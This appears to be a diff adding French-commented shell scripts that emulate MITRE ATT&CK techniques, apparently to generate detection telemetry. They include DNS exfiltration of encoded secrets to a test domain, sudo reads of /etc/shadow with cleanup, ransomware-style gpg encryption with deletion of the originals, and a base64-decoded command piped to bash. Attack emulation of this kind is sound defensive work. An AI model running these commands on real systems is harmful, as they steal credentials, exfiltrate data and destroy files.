@@ -1,3 +1,98 @@
+1. Exfiltration DNS (T1048) - Flux Réseau
+# Génère 10 requêtes DNS avec des payloads en Base64
+for i in {1..10}; do 
+    # Création d'un faux secret (ex: CB ou Token)
+    secret="SECRET_DATA_${i}_$(shuf -i 1000-9999 -n 1)"
+    encoded_secret=$(echo -n "$secret" | base64 | tr -d '=')
+    
+    echo "[$i/10] Exfiltration DNS : $secret"
+    
+    # Utilisation de dig pour forcer une résolution sur un domaine inexistant
+    # Cela génère des kprobes sur les sockets UDP/DNS
+    dig @8.8.8.8 "${encoded_secret}.exfiltrated.test" +short > /dev/null 2>&1
+    
+    sleep 0.5
+done
+
+2. Vol d'identifiants (T1003.008) - Accès Fichiers Sensibles
+# Tentatives d'accès au fichier shadow (Nécessite sudo pour générer un vrai log de lecture)
+for i in {1..10}; do
+    echo "[$i/10] Tentative d'accès Credentials..."
+    
+    # Variante 1 : Lecture directe via cat
+    sudo cat /etc/shadow > /tmp/shadow_copy_$i.txt 2>/dev/null
+    
+    # Variante 2 : Utilisation de 'grep' pour simuler une recherche de hash
+    sudo grep "root" /etc/shadow >> /dev/null 2>&1
+    
+    # Nettoyage discret
+    rm /tmp/shadow_copy_$i.txt
+    sleep 0.2
+done
+
+3. Chiffrement / Ransomware (T1486) - Lecture/Écriture Intensive
+# Simule un ransomware chiffrant des documents
+mkdir -p /tmp/victim_files
+
+for i in {1..10}; do
+    # 1. Création d'un fichier de données sensibles
+    echo "Donnees bancaires confidentielles numero $i" > "/tmp/victim_files/compta_$i.db"
+    
+    echo "[$i/10] Chiffrement du fichier compta_$i.db"
+    
+    # 2. Chiffrement symétrique avec GPG (AES256)
+    # --batch et --passphrase permettent l'automatisation
+    gpg --batch --yes --passphrase "MalwarePass123" \
+        -c "/tmp/victim_files/compta_$i.db" 2>/dev/null
+    
+    # 3. Suppression de l'original (comportement typique ransomware)
+    rm "/tmp/victim_files/compta_$i.db"
+    
+    sleep 0.3
+done
+
+4. Exécution Obfusquée (T1059.004) - Comportement Suspect
+# Décode et exécute une commande simple (id) via un pipe
+for i in {1..5}; do
+    echo "[$i/5] Exécution de commande obfusquée (base64)"
+    # Décode "whoami; id; hostname" et l'envoie à bash
+    echo "d2hvYW1pOyBpZDsgaG9zdG5hbWU=" | base64 -d | bash > /dev/null
+    sleep 1
+done
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 C. Technique T1048 (Exfiltration DNS - via dig)
 # Simule l'envoi d'une donnée secrète (ex: numéro de carte bancaire) via DNS
 secret="4500-1234-5678-9012"
